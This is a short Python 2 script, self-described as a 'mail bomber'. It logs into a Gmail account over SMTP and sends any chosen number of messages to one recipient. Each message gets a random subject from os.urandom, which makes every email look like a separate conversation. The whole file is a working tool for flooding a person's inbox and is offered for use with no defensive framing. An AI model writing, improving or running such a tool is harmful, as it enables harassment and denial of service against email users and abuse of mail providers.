#!/usr/bin/python

### random subjects created automatically to show each mail as a differnt or unique conversatio ##

## mail bomber to send as much as mails to someone as you want to 

## works only for gmail server i.e. senders mail should be of gmail and reciever could have any mail server

## made by shubham kumar 

## github link github.com/sksdbest

import os
import smtplib
import getpass
import sys

server = raw_input ('Server Mail: ')
user = raw_input('Username: ')
passwd = getpass.getpass('Password: ')

to = raw_input('\nTo: ')
body = raw_input('Message: ')
total = input('Number of send: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
else:
    print 'Applies only for gmail mail servers'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rSending mail No: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Sended %i mails !!!' % i
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect. Or check that you allowed to login less secure app or not '
    sys.exit()
